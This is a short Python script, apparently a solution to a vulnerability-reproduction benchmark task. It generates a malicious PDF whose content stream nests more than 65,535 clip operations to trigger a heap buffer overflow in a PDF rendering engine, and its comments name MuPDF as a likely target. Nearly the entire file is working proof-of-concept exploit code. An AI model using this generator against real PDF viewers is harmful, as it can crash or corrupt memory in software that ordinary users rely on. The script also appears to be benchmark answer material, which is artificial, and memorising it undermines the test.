import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Buffer Overflow caused by unchecked nesting depth 
        # when pushing clip marks. This typically occurs in PDF rendering engines (like MuPDF)
        # when the clip stack or graphics state stack exceeds a certain limit (often 65535).
        # We generate a PDF with > 65535 nested clip operations.

        # Number of repetitions. 66000 ensures we exceed 16-bit limits (65535).
        N = 66000
        
        # Payload Construction:
        # q: Save graphics state (pushes to state stack)
        # 0 0 m: Move to 0,0 (defines a minimal current path)
        # W: Clip (pushes to clip stack using current path)
        # n: End path (clears current path)
        # The space at the end ensures separation from the next 'q'.
        # Length per chunk: 12 bytes. Total payload ~792KB.
        chunk = b"q 0 0 m W n "
        stream = chunk * N
        
        # PDF Components
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n"
        
        # Object 4: Content Stream
        o4_head = b"4 0 obj\n<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n"
        o4_foot = b"\nendstream\nendobj\n"
        o4 = o4_head + stream + o4_foot
        
        objs = [o1, o2, o3, o4]
        
        # Build PDF binary
        f = io.BytesIO()
        f.write(header)
        offsets = []
        for o in objs:
            offsets.append(f.tell())
            f.write(o)
            
        # XREF Table
        xref_pos = f.tell()
        f.write(b"xref\n")
        f.write(f"0 {len(objs) + 1}\n".encode("ascii"))
        f.write(b"0000000000 65535 f \n")
        for off in offsets:
            # XREF entries must be exactly 20 bytes: 10 digit offset, space, 5 digit gen, space, n, space, nl
            f.write(f"{off:010d} 00000 n \n".encode("ascii"))
            
        # Trailer
        f.write(b"trailer\n")
        f.write(f"<< /Size {len(objs) + 1} /Root 1 0 R >>\n".encode("ascii"))
        f.write(b"startxref\n")
        f.write(f"{xref_pos}\n".encode("ascii"))
        f.write(b"%%EOF")
        
        return f.getvalue()